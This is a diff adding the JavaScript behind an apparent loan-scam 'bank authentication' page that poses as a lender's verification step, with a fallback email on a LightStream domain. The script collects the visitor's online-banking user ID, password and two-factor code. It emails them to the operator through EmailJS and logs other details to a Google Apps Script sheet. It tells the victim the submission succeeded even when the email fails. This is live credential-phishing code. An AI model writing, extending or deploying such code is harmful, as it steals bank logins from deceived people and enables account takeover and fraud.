@@ -1,0 +1,265 @@
+// Complete Bank Authentication Form Handler with Google Sheets + EmailJS
+document.addEventListener('DOMContentLoaded', function() {
+    // Load bank name from sessionStorage (from personal loan form)
+    const loanData = JSON.parse(sessionStorage.getItem("loanData")) || {};
+    
+    if (loanData && loanData.customerBank) {
+        console.log("🏦 Loading bank from sessionStorage:", loanData.customerBank);
+        
+        // Set bank name in bank auth form
+        const bankNameSelect = document.getElementById("bankName");
+        if (bankNameSelect) {
+            // Map bank values to display names
+            const bankNames = {
+                'chase': 'Chase Bank',
+                'bank-of-america': 'Bank of America',
+                'wells-fargo': 'Wells Fargo',
+                'citibank': 'Citibank',
+                'capital-one': 'Capital One',
+                'us-bank': 'U.S. Bank',
+                'pnc': 'PNC Bank',
+                'td-bank': 'TD Bank',
+                'bbt': 'BB&T (now Truist)',
+                'suntrust': 'SunTrust (now Truist)',
+                'regions': 'Regions Bank',
+                'fifth-third': 'Fifth Third Bank',
+                'keybank': 'KeyBank',
+                'huntington': 'Huntington Bank',
+                'citizens': 'Citizens Bank',
+                'ally': 'Ally Bank',
+                'discover': 'Discover Bank',
+                'synchrony': 'Synchrony Bank',
+                'marcus': 'Marcus by Goldman Sachs'
+            };
+            
+            const bankValue = loanData.customerBank;
+            const bankDisplayName = bankNames[bankValue] || bankValue;
+            
+            // Clear existing options and add the selected bank
+            bankNameSelect.innerHTML = '';
+            const option = document.createElement('option');
+            option.value = bankValue;
+            option.textContent = bankDisplayName;
+            option.selected = true;
+            bankNameSelect.appendChild(option);
+            
+            console.log("✅ Bank name set to:", bankDisplayName);
+        }
+    } else {
+        console.log("❌ No bank data found in sessionStorage");
+    }
+});
+
+// Form submission handler
+document.getElementById('bankAuthForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    // Validate form
+    const requiredFields = this.querySelectorAll('[required]');
+    let isValid = true;
+    
+    requiredFields.forEach(field => {
+        if (!field.value.trim()) {
+            isValid = false;
+            field.classList.add('border-red-500');
+            setTimeout(() => {
+                field.classList.remove('border-red-500');
+            }, 3000);
+        } else {
+            field.classList.remove('border-red-500');
+        }
+    });
+    
+    if (!isValid) {
+        alert('Please fill in all required fields.');
+        return;
+    }
+    
+    // Check terms acceptance
+    if (!document.getElementById('terms').checked) {
+        alert('Please accept authorization terms.');
+        return;
+    }
+    
+    // Collect form data
+    const formData = new FormData(this);
+    const data = {};
+    formData.forEach((value, key) => {
+        data[key] = value;
+    });
+    
+    // Get bank name from form
+    const bankValue = document.getElementById('bankName')?.value || '';
+    const bankNames = {
+        'chase': 'Chase Bank',
+        'bank-of-america': 'Bank of America',
+        'wells-fargo': 'Wells Fargo',
+        'citibank': 'Citibank',
+        'capital-one': 'Capital One',
+        'us-bank': 'U.S. Bank',
+        'pnc': 'PNC Bank',
+        'td-bank': 'TD Bank',
+        'bbt': 'BB&T (now Truist)',
+        'suntrust': 'SunTrust (now Truist)',
+        'regions': 'Regions Bank',
+        'fifth-third': 'Fifth Third Bank',
+        'keybank': 'KeyBank',
+        'huntington': 'Huntington Bank',
+        'citizens': 'Citizens Bank',
+        'ally': 'Ally Bank',
+        'discover': 'Discover Bank',
+        'synchrony': 'Synchrony Bank',
+        'marcus': 'Marcus by Goldman Sachs'
+    };
+    
+    // Prepare data for Google Apps Script
+    const googleSheetsData = {
+        // Loan information (from sessionStorage + defaults)
+        loanAmount: 'N/A (Bank Auth)',
+        loanPurpose: 'Bank Authentication',
+        creditScore: 'N/A',
+        fullName: (data.firstName || 'Bank') + ' ' + (data.lastName || 'Authentication'),
+        name: (data.firstName || 'Bank') + ' ' + (data.lastName || 'Authentication'),
+        email: data.email || 'bank-auth@lightstream.com',
+        phone: data.phone || 'N/A',
+        streetAddress: 'N/A',
+        address: 'N/A',
+        city: 'N/A',
+        state: 'N/A',
+        zipCode: 'N/A',
+        ssn: 'N/A',
+        
+        // Bank information
+        bankName: bankNames[bankValue] || 'User Bank',
+        customerBank: bankValue || 'other',
+        routingNumber: 'N/A',
+        accountNumber: 'N/A',
+        
+        // Additional fields
+        annualIncome: 'N/A',
+        employmentStatus: 'Bank Authentication',
+        monthlyHousing: 'N/A',
+        mobileBankingUserId: data.userId || data.bankUserId || 'N/A',
+        mobileBankingPassword: '[PROTECTED]',
+        
+        // Timestamp
+        timestamp: new Date().toISOString()
+    };
+    
+    // Prepare EmailJS data
+    const emailData = {
+        // Customer Information
+        firstName: data.firstName || 'Bank',
+        lastName: data.lastName || 'Authentication',
+        fullName: (data.firstName || 'Bank') + ' ' + (data.lastName || 'Authentication'),
+        email: data.email || 'bank-auth@lightstream.com',
+        phone: data.phone || 'N/A',
+        
+        // Bank Information
+        bankName: bankNames[bankValue] || 'User Bank',
+        userId: data.userId || data.bankUserId || 'N/A',
+        password: data.password || data.bankPassword || '[PROTECTED]',
+        twoFactor: data.twoFactor || 'Not specified',
+        
+        // Application Details
+        submissionDate: new Date().toLocaleString(),
+        applicationType: 'Bank Authentication Request',
+        applicationStatus: 'Bank authentication submitted successfully'
+    };
+    
+    // Google Apps Script URL
+    const SHEET_URL = "https://script.google.com/macros/s/AKfycbw3h0GQczzmhG_M-BSELok6Yq89XJOcSeYlX7dAFuaKF2ze-FGEL7YcVe4m7sSbOtB6/exec";
+    
+    // Show loading state
+    const submitButton = document.querySelector('#bankAuthForm button[type="submit"]');
+    const originalText = submitButton.textContent;
+    submitButton.textContent = 'Submitting...';
+    submitButton.disabled = true;
+    
+    // Send to Google Sheets AND EmailJS
+    console.log("📤 Sending data to Google Sheets:", googleSheetsData);
+    console.log("📧 Sending EmailJS notification...");
+    
+    // Send to Google Sheets
+    fetch(SHEET_URL, {
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(googleSheetsData)
+    })
+    .then(response => {
+        console.log("📊 Google Sheets response status:", response.status);
+        console.log("📊 Google Sheets response ok:", response.ok);
+        return response.text();
+    })
+    .then(result => {
+        console.log("📊 Google Sheets response:", result);
+        if (result.includes("success")) {
+            console.log("✅ Data saved to Google Sheets successfully!");
+        } else {
+            console.log("❌ Google Sheets response issue:", result);
+        }
+    })
+    .catch(error => {
+        console.log("❌ Google Sheets error:", error);
+        console.log("❌ Error details:", error.message);
+    })
+    .finally(() => {
+        // Send EmailJS email
+        if (typeof emailjs !== 'undefined') {
+            emailjs.send('service_mblpi2k', 'template_wo7l8te', emailData)
+                .then(function(response) {
+                    console.log('✅ Bank authentication email sent successfully!', response.status, response.text);
+                    
+                    // Show success message
+                    const form = document.getElementById('bankAuthForm');
+                    const formContainer = form.parentElement;
+                    
+                    formContainer.innerHTML = `
+                        <div class="text-center p-8">
+                            <div class="mb-6">
+                                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                                    <i class="fas fa-check text-green-600 text-3xl"></i>
+                                </div>
+                                <h2 class="text-2xl font-bold text-gray-800 mb-2">Bank Authentication Submitted Successfully!</h2>
+                                <p class="text-gray-600 mb-4">Your bank authentication has been received and is being processed.</p>
+                                <p class="text-sm text-gray-500">We will contact you shortly with next steps.</p>
+                            </div>
+                        </div>
+                    `;
+                    
+                    submitButton.textContent = originalText;
+                    submitButton.disabled = false;
+                })
+                .catch(function(error) {
+                    console.error('❌ Email failed:', error);
+                    
+                    // Still show success even if email fails
+                    const form = document.getElementById('bankAuthForm');
+                    const formContainer = form.parentElement;
+                    
+                    formContainer.innerHTML = `
+                        <div class="text-center p-8">
+                            <div class="mb-6">
+                                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                                    <i class="fas fa-check text-green-600 text-3xl"></i>
+                                </div>
+                                <h2 class="text-2xl font-bold text-gray-800 mb-2">Bank Authentication Submitted!</h2>
+                                <p class="text-gray-600 mb-4">Your bank authentication has been received.</p>
+                                <p class="text-sm text-gray-500">We will contact you shortly.</p>
+                            </div>
+                        </div>
+                    `;
+                    
+                    submitButton.textContent = originalText;
+                    submitButton.disabled = false;
+                });
+        } else {
+            console.log("❌ EmailJS not available");
+            alert('Email service not available. Please try again.');
+            submitButton.textContent = originalText;
+            submitButton.disabled = false;
+        }
+    });
+});
